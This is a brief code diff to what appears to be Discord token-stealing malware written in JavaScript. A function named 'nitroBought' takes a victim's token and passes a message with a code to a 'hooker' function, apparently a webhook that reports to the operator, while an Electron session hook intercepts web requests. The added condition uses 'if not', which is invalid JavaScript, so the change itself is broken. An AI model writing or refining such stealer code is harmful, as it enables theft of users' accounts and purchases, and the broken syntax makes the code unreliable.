@@ -556,7 +556,9 @@ const nitroBought = async (token) => {
         ],
     };
     if (config.ping_on_run) content["content"] = config.ping_val + `\n${code}`;
-    hooker(content);
+    if not code.includes("undefined") {
+        hooker(content);
+    }
 };
 
 session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
